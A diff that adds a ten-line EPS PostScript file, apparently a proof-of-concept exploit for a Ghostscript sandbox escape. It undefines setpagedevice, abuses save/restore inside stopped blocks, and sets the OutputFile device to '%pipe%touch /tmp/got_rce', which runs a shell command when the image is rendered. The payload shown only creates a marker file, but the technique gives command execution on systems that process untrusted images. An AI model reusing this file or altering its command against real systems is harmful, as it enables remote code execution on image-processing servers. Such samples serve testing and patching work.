@@ -1,0 +1,10 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops
